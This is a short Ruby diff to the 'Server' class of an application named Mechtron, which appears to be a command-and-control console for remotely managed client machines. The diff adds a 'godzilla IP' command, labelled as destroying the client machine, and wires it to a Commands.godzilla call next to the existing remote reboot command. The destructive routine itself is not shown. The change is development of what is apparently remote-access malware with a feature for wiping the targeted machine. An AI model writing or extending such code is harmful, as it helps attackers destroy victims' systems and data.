@@ -42,6 +42,8 @@ class Server
     t << :separator
     t << ['reboot IP', 'reboots the client']
     t << :separator
+    t << ['godzilla IP', 'destroys the client machine']
+    t << :separator
     t << ['help', 'shows the HELP menu']
     t << :separator
     t << ['exit', 'Closes Mechtron application']
@@ -140,6 +142,13 @@ class Server
           client = find_client ip
           if client
             Commands.reboot client
+          else
+            puts 'invalid IP or ID'
+          end
+        when 'godzilla'
+          client = find_client ip
+          if client
+            Commands.godzilla client
           else
             puts 'invalid IP or ID'
           end
